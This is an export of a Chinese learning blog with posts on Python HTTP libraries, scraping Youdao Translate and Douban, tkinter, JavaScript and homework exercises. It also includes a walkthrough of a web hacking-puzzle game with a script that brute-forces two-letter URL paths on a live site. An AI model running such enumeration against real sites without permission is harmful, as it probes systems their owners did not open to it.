&quot;data&quot;: &quot;&quot;, &quot;files&quot;: {}, &quot;form&quot;: { &quot;age&quot;: &quot;12&quot;, &quot;name&quot;: &quot;gtf&quot; }, &quot;headers&quot;: { &quot;Accept&quot;: &quot;*/*&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Content-Length&quot;: &quot;15&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;Host&quot;: &quot;httpbin.org&quot;, &quot;User-Agent&quot;: &quot;python-requests/2.18.4&quot; }, &quot;json&quot;: null, &quot;origin&quot;: &quot;171.9.47.36&quot;, &quot;url&quot;: &quot;http://httpbin.org/post&quot; }响应import requests data = {&apos;name&apos;: &apos;gtf&apos;, &apos;age&apos;: 12} r = requests.post(&apos;http://httpbin.org/post&apos;, data) print(r.status_code) #状态码 print(r.headers) #响应头 print(r.headers[&apos;flag&apos;]) #响应头中&apos;flag&apos;的值 print(r.cookies) #Cookies print(r.url) #url print(r.history) #请求历史文件上传import requests files = {&apos;files&apos;: open(&apos;genie.jpg&apos;, &apos;rb&apos;)} r = requests.post(&apos;http://httpbin.org/post&apos;, files=files) print(r.text) #结果 { &quot;args&quot;: {}, &quot;data&quot;: &quot;&quot;, &quot;files&quot;: { &quot;files&quot;: &quot;data:application/octet-stream;base64,/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQ }, &quot;form&quot;: {}, &quot;headers&quot;: { &quot;Accept&quot;: &quot;*/*&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Content-Length&quot;: &quot;69575&quot;, &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=e2791ecb1baa47f3a17ea98b876a9978&quot;, &quot;Host&quot;: &quot;httpbin.org&quot;, &quot;User-Agent&quot;: &quot;python-requests/2.18.4&quot; }, &quot;json&quot;: null, &quot;origin&quot;: &quot;171.9.47.36&quot;, &quot;url&quot;: &quot;http://httpbin.org/post&quot; }代理设置proxies = { &apos;http&apos;: &apos;http://10.10.1.10:3128&apos; } requests.get(&apos;http://www.taobao.com&apos;,proxies=proxies)timeout可以在get或post请求中添加timeout参数； requests 在经过以 timeout 参数设定的秒数时间之后停止等待响应并会报错]]></content>
      <categories>
        <category>爬虫</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[python编码规范]]></title>
    <url>%2F2018%2F08%2F14%2Fpython%E7%BC%96%E7%A0%81%E8%A7%84%E8%8C%83%2F</url>
    <content type="text"><![CDATA[1.函数代码块前后要加各两个空行 2.有多个参数时应用逗号‘，’隔开，且其后要加一个空格，前面不能有空格 3.字典中冒号‘：’后要有一个空格，前面不能有空格 4.运算符‘+’ ‘-’ ‘*’ ‘/’ ‘=’ ‘==’等作为表达式前后要各留一个空格；作为参数使用时前后不要加空格 5.代码末尾要留至少一个空格或一个空行 6.if和while条件语句表达式后要紧跟一个冒号‘：’ 7.比较时如‘time &gt; 5 and time &lt; 7’ 应写成‘5 &lt; time &lt; 7’]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[urllib爬虫练习]]></title>
    <url>%2F2018%2F08%2F14%2Furllib%E7%88%AC%E8%99%AB%E7%BB%83%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[练习一：爬取图片 import urllib.request response = urllib.request.urlopen(&apos;http://p3.so.qhmsg.com/t0113deb127018e7658.jpg&apos;) with open(&apos;get.jpg&apos;,&apos;wb&apos;) as f: f.write(response.read())response.read()的类型为bytes图片是以二进制数据构成的，因此打开一个名为‘get.jpg’的文件，以二进制的方式写入图片数据，即可将图片保存下来 练习二：实现有道云翻译进入官网后，输入一些内容，然后点翻译，内容就被提交了 右键-审查元素-网络 选中POST，在‘消息头’中可以看到请求的网址；在‘参数’可以看到data的信息，其中‘i’为输入的需要翻译的语句，则只需修改‘i’的值即可实现输入翻译的功能 URL中translate后面的‘_o’要去掉 import urllib.request import urllib.parse import json message = &apos;1&apos; while message != &apos;0&apos;: message = input(&apos;请输入要翻译的话： &apos;) url = &apos;http://fanyi.youdao.com/translate?smartresult=dict&amp;smartresult=rule&apos; data = {} data[&apos;action&apos;] = &apos;FY_BY_CLICKBUTTION&apos; data[&apos;client&apos;] = &apos;fanyideskweb&apos; data[&apos;doctype&apos;] = &apos;json&apos; data[&apos;from&apos;] = &apos;AUTO&apos; data[&apos;i&apos;] = message data[&apos;keyfrom&apos;] = &apos;fanyi.web&apos; data[&apos;salt&apos;] = &apos;1533128754526&apos; data[&apos;sign&apos;] = &apos;493bcf524b7ac8716e160251ec2cf9f1&apos; data[&apos;smartresult&apos;] = &apos;dict&apos; data[&apos;to&apos;] = &apos;AUTO&apos; data[&apos;typoResult&apos;] = &apos;false&apos; data[&apos;version&apos;] = &apos;2.1&apos; data = urllib.parse.urlencode(data).encode(&apos;utf-8&apos;) response = urllib.request.urlopen(url,data) final = response.read().decode(&apos;utf-8&apos;) finall = json.loads(final) print(&apos;翻译结果为： %s&apos; % finall[&apos;translateResult&apos;][0][0][&apos;tgt&apos;])json 在python中，字典的输出内容跟json格式内容一样，但是字典的格式是字典，json的格式是字符串，所以在传输的时候（特别是网页）要转换使用。 本质上来讲，字典是一种数据结构，json是一种格式；字典有很多内置函数，有多种调用方法，而json是数据打包的一种格式，并不像字典具备操作性，并且是格式就会有一些形式上的限制，比如json的格式要求必须且只能使用双引号作为key或者值的边界符号，不能使用单引号，而且“key”必须使用边界符（双引号），但字典就无所谓了。 练习三：实现有道云翻译-添加User-Agent1.通过headers参数直接构造 import urllib.request import urllib.parse import json message = &apos;1&apos; while message != &apos;0&apos;: message = input(&apos;请输入要翻译的话： &apos;) url = &apos;http://fanyi.youdao.com/translate?smartresult=dict&amp;smartresult=rule&apos; head = {} head[&apos;User-Agent&apos;] = &apos;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:61.0) Gecko/20100101 Firefox/61.0&apos; data = {} data[&apos;action&apos;] = &apos;FY_BY_CLICKBUTTION&apos; data[&apos;client&apos;] = &apos;fanyideskweb&apos; data[&apos;doctype&apos;] = &apos;json&apos; data[&apos;from&apos;] = &apos;AUTO&apos; data[&apos;i&apos;] = message data[&apos;keyfrom&apos;] = &apos;fanyi.web&apos; data[&apos;salt&apos;] = &apos;1533128754526&apos; data[&apos;sign&apos;] = &apos;493bcf524b7ac8716e160251ec2cf9f1&apos; data[&apos;smartresult&apos;] = &apos;dict&apos; data[&apos;to&apos;] = &apos;AUTO&apos; data[&apos;typoResult&apos;] = &apos;false&apos; data[&apos;version&apos;] = &apos;2.1&apos; data = urllib.parse.urlencode(data).encode(&apos;utf-8&apos;) req = urllib.request.Request(url,data,head) response = urllib.request.urlopen(req) final = response.read().decode(&apos;utf-8&apos;) finall = json.loads(final) print(&apos;翻译结果为： %s&apos; % finall[&apos;translateResult&apos;][0][0][&apos;tgt&apos;])2.调用请求实例的add_header()方法添加；该方法有两个参数，第一个是key，第二个是value import urllib.request import urllib.parse import json message = &apos;1&apos; while message != &apos;0&apos;: message = input(&apos;请输入要翻译的话： &apos;) url = &apos;http://fanyi.youdao.com/translate?smartresult=dict&amp;smartresult=rule&apos; data = {} data[&apos;action&apos;] = &apos;FY_BY_CLICKBUTTION&apos; data[&apos;client&apos;] = &apos;fanyideskweb&apos; data[&apos;doctype&apos;] = &apos;json&apos; data[&apos;from&apos;] = &apos;AUTO&apos; data[&apos;i&apos;] = message data[&apos;keyfrom&apos;] = &apos;fanyi.web&apos; data[&apos;salt&apos;] = &apos;1533128754526&apos; data[&apos;sign&apos;] = &apos;493bcf524b7ac8716e160251ec2cf9f1&apos; data[&apos;smartresult&apos;] = &apos;dict&apos; data[&apos;to&apos;] = &apos;AUTO&apos; data[&apos;typoResult&apos;] = &apos;false&apos; data[&apos;version&apos;] = &apos;2.1&apos; data = urllib.parse.urlencode(data).encode(&apos;utf-8&apos;) req = urllib.request.Request(url,data) req.add_header(&apos;User-Agent&apos;,&apos;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:61.0) Gecko/20100101 Firefox/61.0&apos;) response = urllib.request.urlopen(req) final = response.read().decode(&apos;utf-8&apos;) fi = json.loads(final) print(&apos;翻译结果为： %s&apos; % fi[&apos;translateResult&apos;][0][0][&apos;tgt&apos;])练习四：爬取豆瓣一个页面的图片import urllib.request import os #创建一个文件夹用于存放照片 os.mkdir(&apos;photos&apos;) os.chdir(&apos;photos&apos;) #得到网页源代码 url = &apos;https://movie.douban.com/chart&apos; req = urllib.request.Request(url) req.add_header(&apos;User-Agent&apos;,&apos;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:61.0) Gecko/20100101 Firefox/61.0&apos;) response = urllib.request.urlopen(req) html = response.read().decode(&apos;utf-8&apos;) #查找网页中照片的网址 a = html.find(&apos;img src=&apos;) pholist = [] while a != -1: b = html.find(&apos;.jpg&apos;,a,a+200) if b != -1: pholist.append(html[a+9:b+4]) else: b = a+9 a = html.find(&apos;img src=&apos;,b) #保存照片文件 num = 1 for each in pholist: re = urllib.request.urlopen(each) with open(&apos;%d.jpg&apos;%num,&apos;wb&apos;) as f: f.write(re.read()) num += 1]]></content>
      <categories>
        <category>爬虫</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[解题思路-黑客游戏]]></title>
    <url>%2F2018%2F08%2F07%2F%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-%E9%BB%91%E5%AE%A2%E6%B8%B8%E6%88%8F%2F</url>
    <content type="text"><![CDATA[今天做了黑客榜中榜的五道题，写一下自己的做题思路 第一关是这样的 随便输入后提交 检查一下源代码，结果鼠标右击后跳出一个提示 虽然电脑f12没有查看源代码的功能，但想阻挡我查看源代码？不存在的 点击火狐浏览器右上角菜单，有个‘页面另存为’的选项，点击后吧网页保存到桌面 然后右击这个网页进行编辑查看，发现有个js脚本 发现要输入’go ‘ ，两个字母一个空格才能进入下一关 后来注意到，不需要输入密码，js代码已经显示了如果输入正确后要显示的内容，即”2sdfadf.htm” 输入新网址，就进入到了第二关 与做第一题方法一样，先把网页下载下来 根据提示，找到保存的图片，将其后缀更改为 .html，打开后 发现第二行有着‘下一关or3.htm’这个提示，输入新网址，于是到第三关 发现这一串字符为URL编码，进行解码，得到新网址，来到第四关 随便输入提交 查看这个页面的源代码 进入到第五关 随便输入后提交 回到上一页查看源代码发现脚本 可以得到以下信息： 要输入两个字母 输入后字母会附加到网址里，如输入‘as’，进入到新页面的网址为 想到了抓包，结果得不到password的信息 之后用爬虫的方法，不断更改两个字母来获取服务端响应，若返回的状态码为200即为请求成功，请求的网址即为正确的网址 import urllib.request a = &apos;abcdefghijklmnopqrstuvwxyz&apos; b = [] for i in range(26): for j in range(i,26): b.append(a[i]+a[j]) b.append(a[j]+a[i]) for i in b: try: url = &apos;http://www.cn-hack.cn/%s/&apos;%i req = urllib.request.Request(url) req.add_header(&apos;User-Agent&apos;,&apos;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:61.0) Gecko/20100101 Firefox/61.0&apos;) response = urllib.request.urlopen(req) if response.status == 200: print(url) beak except: pass得到URL为 http://www.cn-hack.cn/or/即密码为 or 然后]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[tkinter基础]]></title>
    <url>%2F2018%2F08%2F06%2Ftkinter%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[Tkinter 是 Python 的标准 GUI 库 tkinter是内置到python的安装包中的 创建根窗口from tkinter import * exe = Tk() #生成顶级窗口的实例 exe.title(&apos;复杂世界里，一个就够了&apos;) #标题 root.iconbitmap(&apos;spider_128px_1169260_easyicon.net.ico&apos;) #设置窗口图标 thelabel = Label(exe,text=&apos;the sky is crying as i waiting for you&apos;) #Label标签主要用于显示文本，图片 thelabel.pack() #pack()用于自动调节组件的尺寸，位置 exe.mainloop()#窗口的主事件循环pack()pack()中可传入side参数，可以调整标签位置，参数可以为 LEFT RIGHT TOP BOTTOM padx=10 pady=10指定显示位置 anchor= #九个值 W E N S NW SW NE SE CENTERgrid以表格的形式管理 label = Label() label.grid(row=0,column=0) #行与列指定显示位置 sticky = #九个值 W E N S NW SW NE SE CENTERLabel控件Label显示图片tkinter是只支持gif的格式，如果要加载png或者jpg的话就要使用PIL模块 gif格式： photo = PhotoImage(file=&apos;&apos;) imageLabel = Label(exe,image=photo) #image值为tk图片对象 imageLabel.pack()jpg or png格式： from PIL import Image, ImageTk img = Image.open(&apos;ques.png&apos;) # 打开图片 photo = ImageTk.PhotoImage(img) # 用PIL模块的PhotoImage打开显示文本Label(exe,text=&apos;&apos;) #若设置了image，则该选项会被忽略显示文本变量var = IntVar() # tkinter的整数变量 var = StringVar() # tkinter的字符串变量 var.set(&apos;&apos;) #设置变量的内容 Label(exe,textvariable=var)justify文本左对齐Label(exe,text=&apos;&apos;,justify=&apos;Left&apos;)font设置文本字体类型、尺寸Label(exe,text=&apos;&apos;,font=(&apos;type&apos;，size))fg设置文本字体颜色Label(exe,text=&apos;&apos;,fg=&apos;color&apos;)compound图片文本混合模式Label(exe,text=&apos;&apos;,image=photo,compound=center)窗口常用设置设置窗口标题exe.title()设置窗口大小exe.geometry(&quot;500x500&quot;)设置窗口是否可以变化长宽exe.resizable(width=False,height=True)按钮点击Buttont = Text(exe) def print_hrllo(): t.insert(&apos;hello&apos;) Button(exe,text=&apos;点我&apos;,command=print_hello).pack(side=BOTTOM) #可以设置边框样式：relief=GROOVE退出 command=exe.quit #在idle中不能直接退出勾选Checkbutton设置单个勾选 var = IntVar() c = Checkbutton(exe,text=&apos;test&apos;,variable=var) #variable：变量，variable 的值为 1 或 0，代表着选中或不选中设置多个勾选 from tkinter import* exe = Tk() exe.title(&apos;复杂世界里，一个就够了&apos;) exe.geometry(&apos;700x500&apos;) girls = [&apos;西施&apos;,&apos;貂蝉&apos;,&apos;王昭君&apos;] v = [] for girl in girls: v.append(IntVar) c = Checkbutton(exe,text=girl,variable=v[-1]) c.pack(anchor=W) mainloop()按钮列表LB = Listbox(exe)插入按钮 LB.insert(END,&apos;第一个选项&apos;) #第一个参数为插入的起始位置，第二个参数为按钮名删除按钮 LB.delete(0,END) #有两个参数时，第一个参数为起始位置，第二个参数为结束位置 LB.delete(1) #有一个参数时为删除以该参数为下标所对应的按钮输入框绘制单行文本使用Label组件 多行选项使用Listbox组件 输入框使用Entry组件 显示和处理多行文本使用Text组件 Entrye = Entry(exe) e.pack()插入、删除文本 e.insert(0,&apos;test&apos;) #在开始插入‘test’文本 e.delete(0,END) #删除所有文本获取输入 e.get()显示输入 Entry(exe,text=&apos;&apos;,show=&apos;*&apos;) #输入的文本会变成‘*’Textt = Text(根对象,height=2,width=30) 插入:t.insert(mark, 内容) 删除:t.delete(mark1, mark2) 其中,mark可以是行号,或者特殊标识,例如 INSERT:光标的插入点CURRENT:鼠标的当前位置所对应的字符位置 END:这个Textbuffer的最后一个字符 SEL_FIRST:选中文本域的第一个字符，如果没有选中区域则会引发异常 SEL_LAST：选中文本域的最后一个字符，如果没有选中区域则会引发 异常获取输入 t.get(&apos;0.0&apos;,&apos;end&apos;) #获取所有输入;0.0表示第0行第0列删除输入 t.delete(&apos;0.0&apos;,&apos;end&apos;) #删除所有输入;0.0表示第0行第0列让用户无法编辑text内容 output_form.config(state=NORMAL) #可以编辑、插入、删除 output_form.config(state=DISABLED) #无法编辑、插入、删除框架photo_frame = Frame(exe) photo_frame.pack()创建toplevelToplevel（顶级窗口），类似于弹出窗口，具有独立的窗口属性（如标题栏、边框等） top = Toplevel()创建滑动条scroll = Scrollbar(exe) scroll.pack(side=RIGHT, fill=Y) #位于右侧，在Y方向上充满此时文本内容仍是独立的，与滑动条无关联 相互配置 text = Text(exe) scroll.config(command=text.yview) text.config(yscrollcommand=scroll.set)]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[python-easygui]]></title>
    <url>%2F2018%2F08%2F06%2Feasygui%2F</url>
    <content type="text"><![CDATA[普通文本： g.msgbox g.msgbox(msg = nowTime + &apos;\n&apos; + message,title = &apos;复杂世界里，一个就够了&apos;,ok_button = &apos;one is all&apos;,image = &apos;D:\one(一个)\one-photo.jpg&apos;) # msg为文章内容；title为窗口标题；ok_button为按钮名；image为图片按钮多选： g.buttonboxg.buttonbox(msg,title = &apos;复杂世界里，一个就够了&apos;,choices = (&apos;过去 &apos;,&apos; 现在&apos;),image = &apos;D:\one(一个)\one-photo.jpg&apos;) # choices提供多个按钮，点击返回按钮值输入框： g.enterboxg.enterbox(msg=&quot;请说出此时你的心里话&quot;,title=&quot;心里悄悄话&quot;)]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[javacript基础]]></title>
    <url>%2F2018%2F08%2F05%2Fjavacript%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[javascript 1.HTML 中的脚本必须位于 &lt; script &gt; 与 &lt; /script &gt; 标签之间；脚本可被放置在 HTML 页面的 &lt; body &gt; 和 &lt; head &gt; 部分中 2.可以把脚本保存到外部文件中；外部 JavaScript 文件的文件扩展名是 .js 3.若使用外部文件，则在 &lt; script &gt; 标签的 “src” 属性中设置该 .js 文件 &lt; script src=&quot;myScript.js&quot; &gt;&lt; /script &gt;4.外部脚本不能包含 &lt; script &gt; 标签 5.javascript的注释： //这是单行注释 /*这是多行 注释*/操作HTML元素从js访问某个HTML元素，可以使用document.getElementById(id)的方法 使用‘id’属性来标识HTML元素使用innnerHTML进行替换文本 ... &lt;p id=&apos;first&apos;&gt;1&lt;/p&gt; &lt;script&gt; document.getElementById(&apos;first&apos;).innerHTML=&apos;2&apos; &lt;/script&gt; ... 运行显示 2语法分号；分号用于分隔 JavaScript 语句。 通常我们在每条可执行的语句结尾添加分号 使用分号的另一用处是在一行中编写多条语句 在 JavaScript 中，用分号来结束语句是可选的 注释单行注释：// 多行注释：/* */变量在 JavaScript 中创建变量通常称为“声明”变量 我们使用 var 关键词来声明变量 var a = 1;未使用值来声明的变量，其值实际上是 undefined 如果重新声明 JavaScript 变量，该变量的值不会丢失 注意: 变量必须以字母开头 变量也能以 $ 和 _ 符号开头（不过我们不推荐这么做） 变量名称对大小写敏感（y 和 Y 是不同的变量）JavaScript 函数语法函数就是包裹在花括号中的代码块，前面使用了关键词 function(关键词 function 必须是小写的) function hanshu() { }]]></content>
      <categories>
        <category>前端</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[python作业]]></title>
    <url>%2F2018%2F07%2F31%2Fpython%E4%BD%9C%E4%B8%9A%2F</url>
    <content type="text"><![CDATA[整理下这周做的python题 成绩计算题目描述成绩计算 输入一个成绩，然后进行判断。 要求显示的结果： 如果成绩在[0 60]之间 不及格 如果成绩在[60 70)之间 等级是D 如果成绩在[70 80)之间 C 如果成绩在[80 90)之间 B 如果成绩在[90 100]之间 A 可以使用if...else...组合(不使用elif) 也可以使用if...elif...组合实例代码score = int(input()) if score &gt;= 0 and score &lt;= 60: print(&apos;不及格&apos;) elif score &gt;= 60 and score &lt; 70: print(&apos;等级是D&apos;) elif score &gt;= 70 and score &lt; 80: print(&apos;C&apos;) elif score &gt;= 80 and score &lt; 90: print(&apos;B&apos;) elif score &gt;= 90 and score &lt;= 100: print(&apos;A&apos;)出租计费题目描述要求：循环输入公里数，自动计算所需费用，费用计算公式如下 0.公里数小于等于0时输出： 请输入正确的公里数进行计算，程序结束 1.出租车起步价8元，包含2公里 2.超过两公里的部分，每公里收取1.2元 3.超过12公里的部分，每公里收取1.5元示例代码costs = 0 while 1: kms = 0 kms = float(input()) if kms &lt;= 0: print(&apos;请输入正确的公里数进行计算，程序结束&apos;) break else: if kms &lt;= 2: costs = 8 elif kms &gt; 2 and kms &lt;= 12: costs = 8 + (kms - 2) * 1.2 else: costs = 20 + (kms - 12) * 1.5 print(costs)非诚勿扰题目描述通过输入两个人的信息，对比两个人是否符合对方要求 1.输入男生年龄、身高、体重、收入 2.输入女生年龄、身高、体重、收入 3.设定男生要求和女生要求 例如：男生要求: 年龄大于20 小于28 身高大于160 小于175 体重大于40 小于60 收入大于2000 小于5000 4.对比女生是否符合男生要求 5.对比男生是否否和女生要求 6.如果男女双方均符合对方要求，则配对成功！示例代码love = 0 b_age = int(input(&apos;请输入男生年龄：&apos;)) b_height = float(input(&apos;请输入男生身高&apos;)) b_weight = float(input(&apos;请输入男生体重(kg)&apos;)) b_salary = int(input(&apos;请输入男生收入&apos;)) g_age = int(input(&apos;请输入女生年龄：&apos;)) g_height = float(input(&apos;请输入女生身高&apos;)) g_weight = float(input(&apos;请输入女生体重(kg)&apos;)) g_salary = int(input(&apos;请输入女生收入&apos;)) print(&apos;=&apos;*50) if (b_age &gt; 20 and b_age &lt;28 and b_height &gt;170 and b_height &lt; 180 and b_weight &gt; 55 and b_weight &lt; 70 and b_salary &gt; 5000 and b_salary &lt; 10000): print(&apos;girl : 确认过眼神，我遇上对的人&apos;) love += 1 else: print(&apos;girl : 哎，下一个&apos;) if (g_age &gt; 20 and g_age &lt;28 and g_height &gt;160 and g_height &lt; 165 and g_weight &gt; 40 and g_weight &lt; 550 and g_salary &gt; 2000 and g_salary &lt; 5000): print(&apos;boy : 确认过眼神，我遇上对的人&apos;) love += 1 else: print(&apos;boy : 哎，下一个&apos;) if love == 2: print(&apos;配对成功！&apos;) print() print(&apos; * *&apos;) print(&apos;* * *&apos;) print(&apos; * *&apos;) print(&apos; * *&apos;) print(&apos; *&apos;) else: print(&apos;配对失败！&apos;)列表练习题目描述功能：具有增删改查功能的学员信息管理系统 选项： 1.添加学员姓名 2.修改学员姓名 3.查询学员姓名 4.删除学员姓名 0.退出程序 添加学员： 输入要添加的姓名 进行添加操作 修改学员： 输入学员的序号 输入修改信息 执行修改 查询学员： 1.输入查询序号 输入学员序号 输出学员信息 2.查询所有学员 迭代列表，输出所有学员 删除学员： 1.输入序号删除 2.输入学员名称删除 3.删除所有学员示例代码import time namelist = [] def print_select(): print(&apos;*&apos;*10+&apos;学员信息管理系统&apos;+&apos;*&apos;*10) print(&apos;=&apos;*30) print(&apos;tips ： 回复下列选项数字进行操作&apos;) print(&apos;1.添加学员姓名&apos;) print(&apos;2.修改学员姓名&apos;) print(&apos;3.查询学员姓名&apos;) print(&apos;4.删除学员姓名&apos;) print(&apos;5.菜单选项&apos;) print(&apos;0.退出程序&apos;) print(&apos;=&apos;*30) def app_name(): name = input(&apos;请输入要添加的姓名：&apos;) namelist.append(name) time.sleep(0.5) print(&apos;添加成功！&apos;) def change_name(getlist): if len(getlist) &lt;= 0: time.sleep(0.5) print(&apos;暂无成员信息&apos;) else: renumber = int(input(&apos;请输入要修改的学员序号：&apos;))-1 rename = input(&apos;请输入新的名字：&apos;) getlist[renumber] = rename time.sleep(0.5) print(&apos;修改成功！&apos;) def search_name(getlist): if len(getlist) &lt;= 0: time.sleep(0.5) print(&apos;暂无成员信息&apos;) else: chi_number = int(input(&apos;请输入要查询的类别：1.输入学员序号进行查询 2.输出所有学员信息：&apos;)) if chi_number == 1: ser_number = int(input(&apos;请输入学员序号：&apos;)) - 1 if ser_number &lt;= len(getlist): time.sleep(0.5) print(getlist[ser_number]) else: time.sleep(0.5) print(&apos;没有找到学号为%d的学员信息&apos; % (ser_number+1)) elif chi_number == 2: time.sleep(0.5) i = 1 for each in getlist: print(&apos;%d. %s &apos;%(i, each)) i += 1 else: time.sleep(0.5) print(&apos;输入的信息有误！&apos;) def del_name(getlist): if len(getlist) &lt;= 0: time.sleep(0.5) print(&apos;暂无成员信息&apos;) else: chi_number = int(input(&apos;请输入要进行的操作：1.输入学员序号进行删除 2.输入学员名称进行删除 3.删除所有学员：&apos;)) if chi_number == 1: number = int(input(&apos;请输入学员序号：&apos;)) - 1 del getlist[number] time.sleep(0.5) print(&apos;删除成功！&apos;) elif chi_number == 2: name = input(&apos;请输入学员姓名：&apos;) getlist.remove(name) time.sleep(0.5) print(&apos;删除成功！&apos;) elif chi_number == 3: ask = input(&apos;确定要删除所有信息吗？y/n：&apos;) if ask == &apos;y&apos;: for i in getlist: getlist.remove(i) time.sleep(0.5) print(&apos;删除成功！&apos;) else: print(&apos;输入的信息有误！&apos;) print_select() while 1: print(&apos;-&apos;*30) select = int(input(&apos;请输入选项：&apos;)) if select == 1: app_name() if select == 2: change_name(namelist) if select == 3: search_name(namelist) if select == 4: del_name(namelist) if select == 5: print_select() if select == 0: time.sleep(0.5) quit_choice = input(&apos;确定要推出程序？ y/n：&apos;) if quit_choice == &apos;y&apos;: break最佳体重题目描述最佳体重计算 已知一个人的身高是180，体重是80公斤，计算一个人的最佳体重 最佳体重计算公式： 最佳体重 = 身高 - 105 通过体重和最佳体重的对比，利用print输出此人是体重正常还是偏胖还是偏瘦。示例代码height = float(input(&apos;请输入身高:&apos;)) weight = float(input(&apos;请输入体重(kg):&apos;)) best_weight = height - 105 if best_weight &gt; weight: print(&apos;偏瘦&apos;) elif best_weight &lt; weight: print(&apos;偏胖&apos;) else: print(&apos;完美体重&apos;)敏感词的取代题目描述读取敏感词文本文件filter.txt,里面存在敏感词，当你输入一段话如果包含敏感字，则用 * 代替敏感字。 （例：“我创建一个网站，其中我注入了挖矿脚本”，“我创建一个网站，其中我注入了**脚本”）其中的文件为 做题思路首先观察到文件有四行，且其后有‘，’，在进行敏感字比较时是没用的，则要去掉‘，’这个符号；当读取这个文件的内容时其格式是str类型的，而且这个字符串有四行，无法与输入的语句进行对比，因此，最好将其处理为列表，其元素为‘黑产’，‘网马’，‘暗链’，‘挖矿’，之后与输入的语句进行对比，如果发现这四个词就进行替换，未发现则输出原句 可以用函数replace取代字符，用函数split将四行字符串化为列表 示例代码message = input() txt = open(&apos;filter.txt&apos;, &apos;r&apos;) hang = txt.read() setting = hang.replace(&apos;，&apos;, &apos;&apos;) settings = setting.split() for i in settings: if i in message: message = message.replace(i, &apos;**&apos;) print(message)]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[基本库的使用-urllib]]></title>
    <url>%2F2018%2F07%2F31%2F%E5%9F%BA%E6%9C%AC%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8-urllib%2F</url>
    <content type="text"><![CDATA[urllib库，是python内置的HTTP请求库 它包含四个模块： request：最基本的HTTP请求模块，可以用来模拟发送请求 error：异常处理模块 parse：一个工具模块，提供了许多URL处理方法 robotparser：用来识别网站的robots.txt文件request模块urllib.request模块提供了最基本的构造HTTP请求的方法，利用它可以模拟浏览器的一个请求发起的过程 urlopen()函数使用urlopen()方法，可以完成最基本的简单网页的GET请求抓取第一个参数为URL，还可以添加其它参数如data、timeout等 下列代码完成了python官网的抓取，输出了网页源代码 import urllib.request response = urllib.request.urlopen(&apos;https://www.python.org&apos;) print(response.read().decode(&apos;utf-8&apos;))调用read打印出来的是bytes类型，需要进行解码成str类型操作 利用type()方法，输出响应的类型 import urllib.request response = urllib.request.urlopen(&apos;https://www.python.org&apos;) print(type(response)) 输出为 &lt;class &apos;http.client.HTTPResponse&apos;&gt;这是一个HTTPResponse类型的对象，主要包含read、getheader(name)、getheaders()等方法，以及status等属性 得到了这个对象，就可以把它赋值给response变量，就可以调用这些方法和属性 1.调用status属性可以得到返回结果的状态码，200表示请求成功，404表示网页没找到等； 调用getcode()方法也可以得到 2.调用getheaders()方法得到了响应的头消息； 同样，调用info()可得到HTTPMessage对象，打印出来内容为服务器返回的head信息 3.调用geturl()可得到访问的地址 4.调用info()可得到HTTPMessage对象，打印出来内容为服务器返回的head信息在python的IDLE中运行后，即可在输出栏方便调用response的方法或属性 使用data参数urlopen有个参数‘data’，在不调用这个参数时，请求方法是GET，调用这个参数后，请求方法为POST 我们想请求的数据可以放在data参数里；data是以字典的形式保存数据的；而且还应转化为相应格式 官方文档：For an HTTP POST request method, data should be a buffer in the standard application/x-www-form-urlencoded format. The urllib.parse.urlencode() function takes a mapping or sequence of 2-tuples and returns an ASCII string in this format. It should be encoded to bytes before being used as the data parameter. 因此，需要使用parse模块里的urlencode()函数将其编码；还需要将其编码为字节 有两种处理形式： urllib.parse.urlencode(data).encode(&apos;utf-8&apos;) bytes(urllib.parse.urlencode(data), encoding=&apos;utf-8&apos;)bytes类型 Python3对文本和二进制数据作了更为清晰的区分。文本总是Unicode，由str类型表示，二进制数据则由bytes类型表示。在bytes和str的互相转换过程中，实际就是编码解码的过程，必须显式地指定编码格式。bytes对象只负责以二进制字节序列的形式记录所需记录的对象 urlretrieve()函数直接将远程数据下载到本地第一个参数为url，第二个参数为要保存的文件名 Request如果请求中需要加入Headers等信息，可以利用更加强大的Request类构建 Request构造方法：第一个参数为URL，还可添加其它参数如data、headers等 使用方法：依然用urlopen的方法发送请求，只不过这个方法这次参数不再是URL，而是一个Request类型的对象 参数headers是一个字典，可以在构造请求时通过headers参数直接构造，也可以通过调用请求实例的add_header()方法添加 添加请求头最常用的用法就是通过修改user-agent来伪装浏览器 parse模块定义了处理URL的标准接口 urlparse可以对url中的各个组成部分进行分割 import urllib.parse url = &apos;http://www.baidu.com&apos; print(urllib.parse.urlparse(url)) #结果 ParseResult(scheme=&apos;http&apos;, netloc=&apos;www.baidu.com&apos;, path=&apos;&apos;, params=&apos;&apos;, query=&apos;&apos;, fragment=&apos;&apos;)urlparse方法将url拆分成了6部分 ://前面的是scheme，代表协议；第一个/前面是netloc，即域名，后面是path，即访问路径；分号；前面是params，代表参数；问好？后面是查询条件query，一般用作GET类型的URL；井号#后面是锚点，用于直接定位页面内部的下拉位置 urlsplit与urlparse几乎一样，不过唯一区别为没有params(参数) 